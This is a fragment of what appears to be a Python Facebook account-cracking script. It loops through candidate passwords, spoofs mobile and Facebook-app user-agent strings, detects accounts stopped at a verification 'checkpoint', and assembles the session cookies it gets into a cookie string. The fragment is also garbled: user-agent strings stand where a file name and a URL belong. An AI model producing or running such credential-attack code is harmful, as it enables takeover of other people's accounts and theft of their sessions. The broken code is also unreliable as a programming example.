...
def uaku():
	try:
		ua=open('Mozilla/5.0 (Linux; U; Android 10;  en-us; GT-S927W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4296.85 Mobile Safari/537.36','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('Mozilla/5.0 (Linux; U; Android 10;  en-us; GT-S927W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4296.85 Mobile Safari/537.36').text
		ua=open('Mozilla/5.0 (Linux; U; Android 10;  en-us; GT-S927W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4296.85 Mobile Safari/537.36','w')
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				headapp={"user-agent":"Mozilla/5.0 (Linux; Android 10; RMX1911 Build/QKQ1.200209.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.99 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/376.0.0.12.108;]"}
				if 'no' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
